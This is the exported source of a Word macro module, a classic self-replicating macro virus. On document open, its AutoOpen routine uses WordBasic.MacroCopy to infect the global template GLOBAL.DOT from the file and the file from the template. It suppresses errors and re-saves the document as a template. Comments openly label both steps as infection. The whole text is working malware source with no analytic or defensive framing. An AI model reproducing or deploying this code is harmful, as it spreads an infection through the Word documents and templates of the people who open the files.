   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Dim A$
   Dim Z$
       On Error Resume Next
       A$ = "Global:AutoOpen"
       Z$ = WordBasic.[FileName$]() + ":AutoOpen"
       If A$ = Z$ Then
           WordBasic.Beep
       Else: WordBasic.MacroCopy A$, Z$, 1 ' infect a file from the GLOBAL.DOT
       If A$ = Z$ Then
           WordBasic.Beep
       Else: WordBasic.MacroCopy Z$, A$, 1 ' infect the GLOBAL.DOT from the file
       If A$ = Z$ Then
           WordBasic.Beep
       Else: WordBasic.FileSaveAs Format:=1
   End If
   End If
   End If
   End Sub
